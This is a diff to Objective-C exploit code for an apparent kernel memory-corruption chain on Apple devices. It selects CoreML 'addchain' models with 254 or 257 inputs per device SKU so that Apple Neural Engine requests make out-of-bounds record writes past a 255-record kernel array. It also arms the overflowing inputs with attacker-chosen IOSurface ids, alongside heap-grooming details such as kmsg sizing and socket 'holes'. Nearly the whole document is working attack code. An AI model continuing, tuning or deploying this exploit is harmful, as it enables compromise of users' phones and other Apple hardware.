@@ -68,7 +68,15 @@
    tunes both without a rebuild: prefill = live portkind count placed
    fire-1 hop; burst = the fresh-small census load count (0 for the pure
    conversion round). */
-#define P073_BUILD @"p073-second-table-v12b-labelfix"
+/* v13 (T8150 257-in artifact): model selection + input construction go
+   RUNTIME off LabOff()->ane_table_size — T8150 (24A435, 0x10b8) loads
+   XVRC27_257in_1out_addchain and builds 257 features; EVERY other row
+   (A14/23F77 0x820 included) keeps the 254 path bit-for-bit. Record-area
+   law on T8150: 0x10b8 obj, records +0x90..+0x1080 = 255 in-bounds records
+   (0x10a0 cleared, trailer at +0x1080) — 257-in + 1-out = 258 records =
+   3 OOB record writes at indices 255/256/257 (obj+0x1080/+0x1090/+0x10a0:
+   the out-summary trailer band, smashed past the 255-record array). */
+#define P073_BUILD @"p073-second-table-v13-t8150-257in"
 
 /* kmsg geometry — P034 contract: msgh_size 0x7FC -> kdata 0x820 (ANE class).
    v12: the class is RUNTIME — T8150's record law = 0x10b8 (notes 251/265,
@@ -84,11 +92,19 @@ static uint32_t g_p073_msgSize;   /* msgh bytes; derived per-SKU at tap start */
 static int  g_p073_inpcbFds[P073_N_HOLES];
 static uint32_t g_p073_inpcbN;
 
-/* fire geometry — records 192..253 are OOB (offset >= 0xC00) */
+/* fire geometry — records 192..253 are OOB (offset >= 0xC00).
+   v13: T8150 runs in-count 257 (2 OOB in-records + 1 OOB out-record = 3
+   OOB record writes against the 255-record array) — see P073_INPUTS_257. */
 #define P073_INPUTS       254u
 #define P073_OOB_FIRST    192u
 #define P073_ADDCHAIN     @"XVRC27_254in_1out_addchain"
 #define P073_SMALL        @"simple_1in1out"
+/* v13: T8150 (ane_table_size 0x10b8) artifact — 257 in / 1 out "y" addchain.
+   Same compiled-espresso shape as the 254 family; in-bounds cap on T8150 is
+   255 records, so 254-in is fully in-bounds and 257-in is the OOB shape. */
+#define P073_INPUTS_257   257u
+#define P073_ADDCHAIN_257 @"XVRC27_257in_1out_addchain"
+#define P073_INPUTS_MAX   1024u  /* honest model-description cross-check cap */
 #define P073_HEADSTART_US 0u   /* v9: 0ms headstart (265 MAF table - landing=deterministic record 192 at off 0) */
 #define P073_254_RETRY    3u     /* v3: bounded fill re-fire attempts (v2's 8ms -1
                                     looked like NO-FILL, dirty-ANE suspect: p099
@@ -687,7 +703,21 @@ static NSURL *p073_model_url(NSString *name) {
     }
 
     /* ---- models ---- */
-    NSURL *url254 = p073_model_url(P073_ADDCHAIN);
+    /* v13: runtime SKU law — ONLY the 0x10b8 record-area row (T8150 24A435)
+       switches the artifact to the 257-in addchain (T8150 needs in-count 257:
+       255-cap record area + 1 out = 258 records = 3 OOB record writes; 257-in
+       = 2 OOB in-records per the confirmed round). A14/23F77 (0x820) and
+       every other row keep P073_ADDCHAIN/254 EXACTLY as before. T8150_other
+       has ane_table_size 0 -> 254 path (safe). */
+    uint32_t nIn = 0, oobFirst = 0;
+    BOOL t8150In257 = NO;
+    const LabOffTab *offMdl = LabOff();
+    if (offMdl && offMdl->ane_table_size == 0x10b8u) {
+        t8150In257 = YES;
+    }
+    NSString *modelSel = t8150In257 ? P073_ADDCHAIN_257 : P073_ADDCHAIN;
+    uint32_t nInExpect = t8150In257 ? P073_INPUTS_257 : P073_INPUTS;
+    NSURL *url254 = p073_model_url(modelSel);
     NSURL *urlSmall = p073_model_url(P073_SMALL);
     if (!url254 || !urlSmall) {
         p073_log(@"[-] model missing: addchain=%@ small=%@", url254 ? @"ok" : @"MISSING",
@@ -719,18 +749,38 @@ static NSURL *p073_model_url(NSString *name) {
         if (g_p073_fd >= 0) { fcntl(g_p073_fd, F_FULLFSYNC); close(g_p073_fd); g_p073_fd = -1; }
         NSString *ret = g_p073_buf; g_p073_buf = nil; return ret;
     }
-    p073_log(@"[+] models loaded: addchain (All) + simple_1in1out (CPU+NE)");
+    p073_log(@"[+] models loaded: %@ (All) + simple_1in1out (CPU+NE)", modelSel);
+    /* v13: input count + OOB-first from the SKU row, cross-checked against
+       the loaded model's own description (the compiled-espresso path passes
+       in-count = the model's input count, so the request in-count follows
+       the artifact, not a literal). */
+    nIn = nInExpect;
+    oobFirst = P073_OOB_FIRST;   /* 192 on A14/23F77 — unchanged */
+    if (t8150In257) {
+        oobFirst = offMdl->ane_table_entries ? offMdl->ane_table_entries : 255u;
+    }
+    {
+        NSUInteger descIn = model254.modelDescription.inputDescriptionsByName.count;
+        if (descIn >= 1 && descIn <= P073_INPUTS_MAX && descIn != (NSUInteger)nIn) {
+            p073_log(@"[v13] model description in-count %lu != SKU-expect %u — following the artifact",
+                     (unsigned long)descIn, nIn);
+            nIn = (uint32_t)descIn;
+        }
+    }
+    p073_log(@"[v13] fire law: in-count=%u oobFirst=%u (T8150 %d) — 257-in + 1-out = 258 records "
+             @"= 3 OOB record writes vs the 255-record area (T8150 only)",
+             nIn, oobFirst, t8150In257 ? 1 : 0);
 
-    /* ---- features: in-bounds i+1; OOB (>=192) armed with OUR surface ids ---- */
+    /* ---- features: in-bounds i+1; OOB (>= first OOB record index) armed with OUR surface ids ---- */
     NSMutableDictionary *features = [NSMutableDictionary dictionary];
-    for (uint32_t i = 0; i < P073_INPUTS; i++) {
+    for (uint32_t i = 0; i < nIn; i++) {
         MLMultiArray *arr = [[MLMultiArray alloc] initWithShape:@[ @1 ]
                                                        dataType:MLMultiArrayDataTypeDouble
                                                           error:nil];
         if (!arr) break;
         double val;
-        if (i >= P073_OOB_FIRST && nSurf > 0) {
-            val = (double)surfs[(i - P073_OOB_FIRST) % nSurf].sid;
+        if (i >= oobFirst && nSurf > 0) {
+            val = (double)surfs[(i - oobFirst) % nSurf].sid;
         } else {
             val = (double)(i + 1);
         }
@@ -748,7 +798,13 @@ static NSURL *p073_model_url(NSString *name) {
         if (g_p073_fd >= 0) { fcntl(g_p073_fd, F_FULLFSYNC); close(g_p073_fd); g_p073_fd = -1; }
         NSString *ret = g_p073_buf; g_p073_buf = nil; return ret;
     }
-    p073_log(@"[+] features armed: x_000..x_191 = i+1; x_192..x_253 = our IOSurface ids (D1 consume test)");
+    /* v13 log is nIn/oobFirst-true (A14: 254/192, T8150: 257/255). The
+       expected-y figure is the pure in-bounds arming y = sum(1..in-count);
+       with OOB arming on, y carries IOSurface sids instead (honest). */
+    p073_log(@"[+] features armed: in-count=%u, OOB-feature arming from x_%03u "
+             @"(D1 consume test, only when nSurf>0; else i+1 to x_%03u) — "
+             @"expected y = %u (sum 1..%u)",
+             nIn, oobFirst, nIn - 1u, nIn * (nIn + 1u) / 2u, nIn);
 
     MLMultiArray *smallArr = [[MLMultiArray alloc] initWithShape:@[ @1, @1 ]
                                                         dataType:MLMultiArrayDataTypeFloat32
